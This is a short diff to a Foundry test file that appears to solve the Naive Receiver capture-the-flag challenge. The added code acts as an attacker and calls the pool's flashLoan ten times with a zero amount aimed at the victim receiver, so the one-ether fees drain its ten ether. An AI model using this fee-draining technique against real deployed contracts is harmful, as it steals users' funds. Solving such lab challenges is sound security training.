@@ -48,7 +48,15 @@ contract NaiveReceiver is Test {
         /**
          * EXPLOIT START *
          */
+        vm.startPrank(attacker);
 
+        // User's contract has 10 eth, flash loan fee is 1 eth
+        // If I call 10 times flashloan in the same transaction, we can get all user's funds from contract
+        for( uint256 i = 0; i < 10; i++ ) {
+            naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 0);
+        }
+
+        vm.stopPrank();
         /**
          * EXPLOIT END *
          */
